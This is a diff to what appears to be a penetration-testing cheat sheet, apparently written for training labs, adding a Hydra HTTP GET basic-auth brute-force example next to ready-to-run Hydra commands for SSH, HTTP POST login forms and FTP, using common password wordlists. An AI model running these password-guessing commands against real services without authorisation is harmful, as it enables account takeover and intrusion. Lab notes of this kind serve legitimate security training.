@@ -68,9 +68,13 @@
      - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ssh`
    - **HTTP POST Form Brute Force**:
      - `hydra -l [USER] -P [WORDLIST] [URL] http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Login"`
-     - **Advanced HTTP POST Form Brute Force**:
+     - **HTTP POST Form Brute Force Example**:
      ```bash
      hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.56.169 -V http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
+     ```
+     - **HTTP GET Basic Auth Brute Force Example**:
+     ```bash
+     hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt http-get://enum.thm/labs/basic_auth/ -V
      ```
      - **FTP Brute Forcing**:
      - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ftp`
